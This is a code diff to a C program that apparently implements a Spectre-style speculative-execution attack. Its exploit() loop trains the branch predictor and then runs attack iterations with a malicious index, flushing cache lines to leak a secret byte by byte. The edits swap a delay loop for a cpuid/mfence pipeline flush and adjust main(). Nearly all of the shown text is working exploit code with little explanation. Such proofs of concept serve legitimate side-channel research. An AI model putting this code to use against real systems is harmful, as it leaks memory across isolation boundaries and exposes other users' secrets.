@@ -11,7 +11,7 @@
 
 
 
-
+//#include <stdio.h>
 typedef unsigned long         size_t;
 typedef unsigned int          uint32_t;
 typedef unsigned long long    uint64_t;
@@ -83,7 +83,10 @@ void *memset(void *ptr, int value, size_t num) {
 #define CACHE_PAGE      4096            // 2^12 -> shl $12, %rax
 
 
-
+void flush_pipeline(){
+ __asm__ volatile("cpuid");
+ __asm__ volatile("mfence");
+}
 typedef struct {
     uint8_t unused_1[CACHE_PAGE];       // Memory separator
     union {
@@ -147,9 +150,7 @@ size_t exploit(size_t address, int tries) {
     // 30 loops: 5 training runs (x = training_x), one attack run (x = malicious_x)
     for (int i = 29; i >= 0; i--) {
         _mm_clflush(&buffer.indices_size);          // Flush indices array size from cache to force branch prediction
-        for (volatile int z = 0; z < 100; z++)
-	{
-			} 
+        flush_pipeline();
         
         // Bit twiddling to set x = training_x if i % 6 != 0 or malicious_x if i % 6 == 0
         // Avoid jumps in case those tip off the branch predictor
@@ -342,8 +343,8 @@ int execute(void *addres, size_t len, int tries, exploit_handler exploit) {
         
         //printf("%p ", (void *)x);
         read_byte(x++, &result, tries, threshold, exploit);
-        
-        /*if (result.s1 > 0) {
+        /*
+        if (result.s1 > 0) {
             printf("%9s ", result.zero > 0 ? "Zero" : (result.s1 >= 2 * result.s2 + 2 ? "Success" : "Unclear"));
             printf("0x%02X %c %5d ", result.v1, (result.v1 >= 0x20 && result.v1 <= 0x7E) ? result.v1 : ' ', result.s1);
             if (result.s2 > 0) {
@@ -378,8 +379,8 @@ int execute(void *addres, size_t len, int tries, exploit_handler exploit) {
     return count;
 }
 //################################
-int __attribute__((noreturn)) main() {
-//int main() {
+//int __attribute__((noreturn)) main() {
+int main() {
     void *address = secret;
 
     size_t len = _strlen(secret);
